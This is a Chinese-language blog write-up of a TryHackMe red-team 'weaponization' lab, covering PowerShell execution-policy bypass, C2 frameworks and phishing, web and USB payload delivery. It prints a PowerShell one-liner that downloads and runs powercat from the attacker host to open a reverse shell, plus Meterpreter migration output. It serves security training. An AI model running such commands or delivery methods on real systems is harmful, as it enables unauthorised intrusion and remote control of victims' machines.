<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135312.png" alt="image-20240714105602323"></p>
<h1 id="0x06-powershell-psh">0x06 PowerShell (PSH)</h1>
<h2 id="powershell-psh">PowerShell (PSH)</h2>
<p>PowerShell 是一种面向对象的编程语言，从 .NET 中的动态语言运行时 (DLR) 执行，但遗留用途有一些例外。<a target="_blank" rel="noopener" href="https://tryhackme.com/room/powershell">查看 TryHackMe 房间“使用 PowerShell 进行黑客攻击”</a>，了解有关 PowerShell 的更多信息.</p>
<p>红队人员依靠 PowerShell 执行各种活动，包括初始访问、系统枚举等。首先，我们创建一个简单的 PowerShell 脚本，用于打印“欢迎来到武器化室！”如下，</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Write-Output</span> <span class="hljs-string">"Welcome to the Weaponization Room!"</span></code></pre>
<p>将文件另存为 thm.ps1。通过写入输出，我们打印消息“欢迎来到武器化室！”到命令提示符。现在让我们运行它并查看结果。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135313.png" alt="image-20240714110104387"></p>
<h2 id="execution-policy">Execution Policy</h2>
<p>PowerShell 的执行策略是一个安全选项，用于保护系统免遭恶意脚本的运行。默认情况下，出于安全目的，Microsoft 禁用执行 PowerShell 脚本 .ps1。 PowerShell 执行策略设置为“受限”，这意味着它允许单个命令，但不允许运行任何脚本。</p>
<p>您可以按如下方式确定 Windows 当前的 PowerShell 设置：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135314.png" alt="image-20240714110153684"></p>
<p>我们还可以通过运行以下命令轻松更改 PowerShell 执行策略：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135315.png" alt="image-20240714110255792"></p>
<p>之后选Yes to All即可</p>
<h2 id="bypass-execution-policy">Bypass Execution Policy</h2>
<p>Microsoft 提供了禁用此限制的方法。其中一种方法是为 PowerShell 命令提供参数选项，将其更改为您所需的设置。例如，我们可以将其更改为绕过策略，这意味着没有任何内容被阻止或限制。这很有用，因为它可以让我们运行自己的 PowerShell 脚本。</p>
<p>为了确保我们的 PowerShell 文件得到执行，我们需要在参数中提供绕过选项，如下所示：</p>
<pre><code class="hljs scss">powershell -ex bypass -File thm<span class="hljs-selector-class">.ps1</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135316.png" alt="image-20240714110450893"></p>
<p>现在，让我们尝试使用 PowerShell 编写的工具之一（powercat）来获取反向 shell。在您的 AttackBox 上，从 GitHub 下载它并运行网络服务器来传递有效负载。</p>
<pre><code class="hljs scss">git clone https://github.com/besimorhino/powercat.git</code></pre>
<p>攻击机开启监听</p>
<pre><code class="hljs scss">powershell -c "<span class="hljs-built_in">IEX</span>(New-Object System.Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>:<span class="hljs-number">8000</span>/powercat.ps1');powercat -c <span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span> -e cmd"</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135317.png" alt="image-20240714111239853"></p>
<h1 id="0x07-c2">0x07 C2</h1>
<p>此任务介绍红队行动中使用的命令和控制 (C2) 框架的基本概念。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135318.png" alt="image-20240714111302518"></p>
<h2 id="什么是c2">什么是C2？</h2>
<p>C2 框架是后利用框架，允许红队成员协作并控制受感染的机器。 C2 被认为是红队人员在进攻性网络行动中最重要的工具之一。 C2 框架提供快速、直接的方法来：</p>
<ul>
<li>生成各种恶意负载</li>
<li>枚举受感染的机器/网络</li>
<li>Perform privilege escalation and pivoting<br>
执行权限升级和旋转</li>
<li>Lateral movement</li>
<li>And many others</li>
</ul>
<p>我们将简要介绍的一些流行的 C2 框架包括 Cobalt Strike、PowerShell Empire、Metasploit。这些框架中的大多数旨在支持一个方便的环境，以便在获得系统的初始访问权限后，红队操作之间可以进行共享和通信。</p>
<h2 id="cobalt-strike">Cobalt Strike</h2>
<p>Cobalt Strike 是一个专注于对手模拟和红队行动的商业框架。它是远程访问工具、后利用功能和独特的报告系统的组合。它为代理提供了先进的技术来建立秘密通信并执行各种操作，包括键盘记录、文件上传和下载、VPN 部署、权限升级技术、mimikatz、端口扫描和最先进的横向移动。</p>
<h2 id="powershell-empire">PowerShell Empire</h2>
<p>PowerShell Empire 是一个开源框架，可帮助红队操作员和渗透测试人员使用密钥和共享密码跨多个服务器进行协作。它是一个基于PowerShell和Python代理的开发框架。 PowerShell Empire 专注于 Windows 和 Active Directory 环境的客户端和后期开发。如果您想了解有关 PowerShell Empire 的更多信息，我们建议您尝试一下这个房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/rppsempire">Empire</a>。</p>
<h2 id="metasploit-元分析软件">Metasploit 元分析软件</h2>
<p>Metasploit 是一种广泛使用的漏洞利用框架，它提供了各种技术和工具来轻松执行黑客攻击。它是一个开源框架，被认为是渗透测试和红队运营的主要工具之一。 Metasploit 是我们在这个房间中使用的工具之一，用于为我们的武器化阶段生成有效负载。如果您想了解有关 Metasploit 框架的更多信息，我们建议您查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/module/metasploit">Metasploit 模块</a>。</p>
<p>大多数 C2 框架都使用本房间提到的技术作为初始访问阶段的准备。有关 C2 框架的更多详细信息，我们邀请您查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoc2">C2 简介室</a>。</p>
<h1 id="0x08-delivery-techniques">0x08 Delivery Techniques</h1>
<p>交付技术是获得初始访问的重要因素之一。他们必须让受害者看起来专业、合法且令人信服，才能贯彻执行内容。</p>
<h2 id="email-delivery">Email Delivery</h2>
<p>这是通过发送带有链接或附件的网络钓鱼电子邮件来发送有效负载的常用方法。欲了解更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1566/001/">请访问此处</a>。此方法会附加一个恶意文件，该文件可能是我们之前提到的类型。目标是说服受害者访问恶意网站或下载并运行恶意文件，以获得对受害者网络或主机的初始访问权限。</p>
<p>红队成员应该拥有自己的用于网络钓鱼目的的基础设施。根据红队参与要求，需要在电子邮件服务器内设置各种选项，包括域名密钥识别邮件 (DKIM)、发件人策略框架 (SPF) 和 DNS 指针 (PTR) 记录。</p>
<p>红队成员还可以使用第三方电子邮件服务，例如 Google Gmail、Outlook、Yahoo 以及其他声誉良好的服务。</p>
<p>另一种有趣的方法是使用公司内受损的电子邮件帐户向公司内部或其他人发送网络钓鱼电子邮件。受损的电子邮件可能会通过网络钓鱼或其他技术（例如密码喷射攻击）遭到黑客攻击。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135319.png" alt="image-20240714111810932"></p>
<h2 id="web-delivery">Web Delivery</h2>
<p>另一种方法是在红队成员控制的网络服务器上托管恶意负载。 Web 服务器必须遵循安全准则，例如其域名和 TLS（传输层安全）证书的干净记录和声誉。欲了解更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1189/">请访问此处</a>。</p>
<p>此方法包括其他技术，例如通过社会工程让受害者访问或下载恶意文件。使用此方法时，URL 缩短器可能会有所帮助。</p>
<p>在该方法中，可以组合和使用其他技术。攻击者可以利用0day漏洞，例如利用 Java 或浏览器等易受攻击的软件，将其用于网络钓鱼电子邮件或 Web 交付技术，从而获得对受害计算机的访问权限。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135320.png" alt="image-20240714111908463"></p>
<h2 id="usb-delivery">USB Delivery</h2>
<p>这种方法需要受害者物理插入恶意USB。在对手可以分发 USB 的会议或活动中，此方法可能有效且有用。有关 USB 传输的更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1091/">请访问此处</a>。</p>
<p>通常，组织会制定强有力的策略，例如出于安全目的在其组织环境中禁用 USB 使用。而其他组织允许在目标环境中使用它。</p>
<p>用于武器化 USB 设备的常见 USB 攻击包括 <a target="_blank" rel="noopener" href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe">Rubber Ducky</a> 和 ​​<a target="_blank" rel="noopener" href="https://www.minitool.com/news/usbharpoon.html">USBHarpoon</a>、充电 USB 电缆（例如 <a target="_blank" rel="noopener" href="https://shop.hak5.org/products/omg-cable">O.MG Cable</a>）.</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135321.png" alt="image-20240714112123207"></p>
<h1 id="0x09-练习">0x09 练习</h1>
<p>我们准备了一台 Windows 10 计算机，该计算机运行用户模拟 Web 应用程序来执行您的有效负载或自动访问恶意 HTA 链接。部署连接的计算机并等待几分钟，直到其启动并运行。然后，访问用户模拟器 Web 应用程序：http://MACHINE_IP:8080/.</p>
<p>确保从 AttackBox 访问用户模拟器 Web 应用程序，或者您可以通过连接到 VPN 来访问它。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135322.png" alt="image-20240714112447273"></p>
<p>Web 应用程序允许将有效负载上传为 VBS、DOC、PS1 文件。此外，如果您提供恶意 HTA 链接，Web 应用程序将访问您的链接。</p>
<p>Doc 文件注意：在提供的 Windows 10 机器中使用的模拟将打开恶意 Word 文档并在 90 秒内关闭。为了获得更长时间的预知，您需要在收到返回连接后立即迁移。</p>
<p>在Metasploit框架中，我们可以使用migrate将当前进程注入到受害机器上的另一个进程中。在我们的例子中，我们需要将当前进程（即 MS Word 文档）迁移到另一个进程，以使连接稳定，即使 MS Word 文档关闭也是如此。最简单的方法是使用迁移后模块，如下所示，</p>
<pre><code class="hljs scss">meterpreter &gt; run post/windows/manage/migrate 

<span class="hljs-selector-attr">[*]</span> Running module against DESKTOP-<span class="hljs-number">1</span>AU6NT4
<span class="hljs-selector-attr">[*]</span> Current server process: svchost.exe (<span class="hljs-number">3280</span>)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID <span class="hljs-number">0</span>
[*] Migrating into <span class="hljs-number">4960</span>
[+] Successfully migrated into process <span class="hljs-number">4960</span></code></pre>
<p>在此任务中，目标是生成您选择的反向 shell 负载并通过 Web 应用程序发送它。一旦 Web 应用程序运行您的有效负载，您应该会收到返回的连接。回答下面的问题，并在收到反向 shell 后找到该标志来证明您的访问权限。</p>
<p>作为参考，您可以使用本网站上的 <a target="_blank" rel="noopener" href="https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/">MSFVenom 备忘单</a>。</p>
<p>这里使用的msfconsole的hta</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135323.png" alt="image-20240714113232128"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135324.png" alt="image-20240714113206433"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135325.png" alt="image-20240714113405110"></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/14/ctf-shua-ti/">CTF刷题</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/10/thm-hong-dui-zhen-cha/">THM-红队侦察</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFweaponization"><span class="toc-text">什么是Weaponization</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%83%A8%E7%BD%B2windows%E6%9C%BA%E5%99%A8"><span class="toc-text">0x02 部署Windows机器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-windows-scripting-host-wsh"><span class="toc-text">0x03 Windows Scripting Host (WSH)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wsh"><span class="toc-text">WSH</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-an-html-application-hta"><span class="toc-text">0x04 An HTML Application (HTA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#html-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-text">HTML 应用程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hta%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-text">HTA反向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-metasploit-%E7%9A%84%E6%81%B6%E6%84%8F-hta"><span class="toc-text">通过 Metasploit 的恶意 HTA</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-visual-basic-for-application-vba"><span class="toc-text">0x05 Visual Basic for Application (VBA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#visual-basic-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-vba"><span class="toc-text">Visual Basic 应用程序 (VBA)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-powershell-psh"><span class="toc-text">0x06 PowerShell (PSH)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell-psh"><span class="toc-text">PowerShell (PSH)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execution-policy"><span class="toc-text">Execution Policy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-execution-policy"><span class="toc-text">Bypass Execution Policy</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-c2"><span class="toc-text">0x07 C2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFc2"><span class="toc-text">什么是C2？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobalt-strike"><span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell-empire"><span class="toc-text">PowerShell Empire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit-%E5%85%83%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6"><span class="toc-text">Metasploit 元分析软件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-delivery-techniques"><span class="toc-text">0x08 Delivery Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#email-delivery"><span class="toc-text">Email Delivery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-delivery"><span class="toc-text">Web Delivery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usb-delivery"><span class="toc-text">USB Delivery</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%BB%83%E4%B9%A0"><span class="toc-text">0x09 练习</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
